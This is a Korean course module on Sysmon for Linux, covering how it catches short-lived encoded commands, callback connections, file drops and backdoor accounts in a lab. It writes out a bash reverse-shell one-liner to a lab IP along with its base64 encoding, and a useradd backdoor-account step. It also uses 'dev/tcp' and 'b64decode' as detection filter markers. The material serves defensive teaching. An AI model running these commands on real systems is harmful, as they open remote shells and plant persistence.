# W11 — 호스트의 비행기록장치: Sysmon for Linux (리버스셸·인코딩 명령의 '그 순간')

> 보안운영 트랙 11주차. 선행: W07(osquery) · W09–W10(Wazuh). 인프라: el34. 플랫폼: tw2.

---

## 1. 이번 주의 통찰 — 스냅샷은 "그 순간"을 놓친다

W07의 **osquery는 스냅샷(snapshot)** 이다 — "지금 이 순간" 무엇이 떠 있나를 SQL로 찍는다. 강력하지만
한계가 있다: 공격이 **짧게 실행되고 사라지면**(단명 프로세스, 즉시 삭제된 파일) 다음 스냅샷 때는 이미 없다.

```
 스냅샷 (osquery)                      이벤트 스트림 (Sysmon for Linux)
 ────────────────                      ──────────────────────────────
 "지금 떠 있는 것"을 찍음              "일어난 모든 일"을 순간순간 기록
 짧게 살다 죽은 프로세스 → 놓침        ProcessCreate/NetworkConnect/FileCreate
 (조사 시점에 살아있어야 보임)          (프로세스가 죽어도 생성 이벤트는 로그에 남음)
```

**Microsoft Sysmon for Linux**(eBPF 기반)가 이벤트 스트림의 대표다 — 프로세스가 **생성되는 순간**의
명령줄(base64 인코딩까지), 네트워크 연결, 파일 생성을 event로 남긴다. 호스트의 **비행기록장치**다.

---

## 2. el34의 sysmon — 호스트에 설치, 컨테이너까지 본다

> el34-web 컨테이너는 비특권(eBPF 권한 없음)이라 컨테이너 안에는 sysmon을 못 돌린다. 대신
> **el34 호스트(192.168.0.151)에 Sysmon for Linux 1.5.2를 설치**했다. 컨테이너 프로세스는 결국
> **호스트 커널의 프로세스**(네임스페이스만 다름)이므로, **호스트 sysmon이 el34-web 내부의 프로세스/
> 네트워크/파일 활동까지 그대로 포착**한다.

```bash
sudo systemctl status sysmon        # 호스트에서 sysmon 데몬(eBPF 센서) 가동
sysmon -c                           # 현재 RuleGroup(필터) 확인
```
- **로그 위치**: `/var/log/syslog`에 `Linux-Sysmon` 소스로 XML event 기록(`ccc`는 `adm` 그룹이라 sudo
  없이 읽음).
- **이벤트 종류**(이 환경 config): **EventID 1 ProcessCreate**, **3 NetworkConnect**, **11 FileCreate**.
  (ProcessTerminate(5)는 노이즈라 억제.)

### 2.1 설치 과정 (el34에 원래 없던 도구 — 참고)

sysmon은 el34 기본 이미지에 없어 **호스트에 직접 설치**했다. 설치 흐름(Ubuntu 22.04, root):
```bash
# ① Microsoft 패키지 저장소 등록
curl -sSL -o /tmp/ms-prod.deb https://packages.microsoft.com/config/ubuntu/22.04/packages-microsoft-prod.deb
dpkg -i /tmp/ms-prod.deb && apt-get update
# ② sysmonforlinux 설치 (eBPF 센서 sysinternalsebpf 의존성 자동)
apt-get install -y sysmonforlinux        # → /usr/bin/sysmon + systemd 'sysmon' 서비스
# ③ config.xml로 시작(=eBPF 로드). 필터 RuleGroup 지정
sysmon -accepteula -i /opt/sysmon-w11.xml   # 재설정은 sysmon -c <file>
```
- **왜 호스트인가**: 컨테이너(el34-web)는 비특권이라 CAP_BPF/SYS_ADMIN이 없어 eBPF 센서를 못 올린다.
  호스트는 root+커널 접근이 되고, 컨테이너 프로세스는 호스트 커널 프로세스라 **호스트 sysmon이 다 본다**.
- **config 필터**: 공유 호스트 syslog 폭주를 막으려 실습 마커(`b64decode`/`dev/tcp`/`w11`, 포트 `53666`)에
  한정. 운영에선 더 폭넓게 캡처 후 분석에서 필터한다.
- **선행 조건**: 호스트 인터넷(packages.microsoft.com 도달), root. eBPF는 커널 5.x+ 필요(el34 호스트 6.8).
- ⚠️ 이 lab config는 실습 마커(`b64decode`/`dev/tcp`/`w11`, 포트 `53666`)에 **필터링**돼 있다 —
  공유 호스트 syslog 폭주 방지. 운영 sysmon은 보통 더 폭넓게 캡처하고 분석에서 필터한다.

---

## 3. 이번 주 침해 사슬 — base64 리버스셸

```
 ① base64 인코딩 명령           ② 콜백 연결                  ③ 백도어 계정
 ──────────────────           ─────────────               ──────────────
 bash -i >& /dev/tcp/…/53666   포트 53666 콜백              smonbd (persistence)
 (탐지 회피용 인코딩)           (리버스셸 채널)
        │                            │                           │
 sysmon ProcessCreate(1)       sysmon NetworkConnect(3)     osquery users
 (인코딩 cmdline 포착!)         (DestinationPort 53666)      (계정 스냅샷)
```

핵심은 ①: 인코딩되고 **짧게 실행되는** 명령을 osquery 스냅샷은 놓치지만, **sysmon은 생성되는 순간의
전체 cmdline을 EventID 1로 남긴다.** 이것이 sysmon의 존재 이유다.

---

## 4. base64 인코딩 명령 — 왜, 어떻게 디코드하나

공격자는 명령을 base64로 인코딩해 의도를 숨긴다.
```bash
echo 'bash -i >& /dev/tcp/10.20.30.202/53666 0>&1' | base64
#  → YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=' | base64 -d
#  → bash -i >& /dev/tcp/10.20.30.202/53666 0>&1     (리버스셸!)
```
- sysmon의 ProcessCreate는 디코딩 명령(`base64 -d`, `b64decode`)의 **cmdline 자체**를 event로 남긴다 →
  사후에도 "무엇을 디코드해 실행했나"를 추적할 수 있다.

---

## 5. ProcessCreate (EventID 1) — sysmon의 별, osquery와의 대비

```bash
# el34-web 안에서 인코딩 명령 실행 (짧게 살고 죽음)
docker exec el34-web python3 -c "import base64; base64.b64decode('aGk=')  # w11 reverse-shell sim"
# osquery 스냅샷 — 이미 죽은 프로세스 → 못 찾음
docker exec el34-web osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
#   → []  (스냅샷의 한계)
# sysmon — 생성 순간이 syslog에 남아있음
grep -a 'Linux-Sysmon' /var/log/syslog | grep -a b64decode | tail -1
#   → <EventID>1</EventID> … <CommandLine>python3 -c import base64...b64decode…  (포착!)
```
이 대비가 W11의 핵심 학습이다 — **단명·인코딩 프로세스는 이벤트 스트림(sysmon)만 잡는다.**

---

## 6. NetworkConnect (EventID 3) — 콜백 연결의 순간

리버스셸이 외부로 콜백할 때 sysmon이 그 연결을 event로 남긴다(DestinationPort 53666).
```bash
grep -a 'Linux-Sysmon' /var/log/syslog | grep -a '<EventID>3<' | grep -a 53666 | tail -1
#   → NetworkConnect … DestinationPort 53666 (콜백 채널 포착)
```
- Suricata(eve.json)가 네트워크 **외부 경계**에서 보는 연결을, sysmon은 **호스트 내부 관점**에서
  "어느 프로세스가" 연결했는지까지 본다. 두 관점이 상호 보완.

---

## 7. FileCreate (EventID 11) — 페이로드가 떨어지는 순간

페이로드 파일 생성도 event로 남는다 — 곧바로 지워도 생성 사실이 로그에 남는다(Wazuh FIM realtime과
같은 발상, 다른 소스).
```bash
docker exec el34-web sh -c 'echo payload > /tmp/w11_payload.b64'
grep -a 'Linux-Sysmon' /var/log/syslog | grep -a '<EventID>11<' | grep -a w11 | tail -1
#   → FileCreate … TargetFilename /tmp/w11_payload.b64
```

---

## 8. persistence — 백도어 계정 (스냅샷이 강한 영역)

계정 생성은 **상태가 남는** persistence라 osquery 스냅샷으로 충분히 잡힌다. 단명 프로세스와 달리
"지속적 흔적"은 스냅샷의 강점 영역 — sysmon(이벤트)과 osquery(스냅샷)는 역할이 다르다.
```bash
docker exec el34-web sh -c 'useradd -m -s /bin/bash smonbd'
docker exec el34-web osqueryi --json 'SELECT username,uid FROM users WHERE username="smonbd";'
docker exec el34-web sh -c 'userdel -r smonbd'   # self-clean
```

---

## 9. 실습(lab) 형식 — 9 미션

1. **점검**: 호스트 sysmon 데몬 가동 + config(3 event) + syslog 소스
2. **base64 디코드**: 리버스셸 페이로드 의도 파악
3. **ProcessCreate(1) + osquery 대비**: 단명 인코딩 프로세스 → sysmon만 포착
4. **NetworkConnect(3)**: 콜백 포트 53666 연결 event
5. **FileCreate(11)**: 페이로드 drop event
6. **persistence**: 백도어 계정 smonbd → osquery → self-clean
7. **sysmon vs osquery**: 이벤트 스트림 vs 스냅샷 역할 정리
8. **종합 보고**: '그 순간'을 누가 잡았나
9. **정리 확인**: 계정/페이로드 잔재 0 (sysmon은 영속 인프라로 유지)

> 공격은 `docker exec el34-web …`, sysmon 관측은 호스트(`ssh ccc@192.168.0.151`)의 `/var/log/syslog`.
> sysmon 자체는 영속 인프라(유지). 실습이 만든 계정/파일/프로세스만 self-clean.

---

## 10. 다음 주차 (W12) 예고 — 위협의 언어(STIX/OpenCTI → Wazuh)

W11까지 호스트·네트워크 텔레메트리를 다뤘다. W12부터는 **위협 인텔리전스** — 알려진 악성 지표(STIX)를
OpenCTI/MISP(el34에 실제 가동 중)에서 가져와 Wazuh가 알아보게(CDB 매칭) 만든다. "이 IP/해시/도구가
알려진 악성인가?"를 자동으로 판별한다.
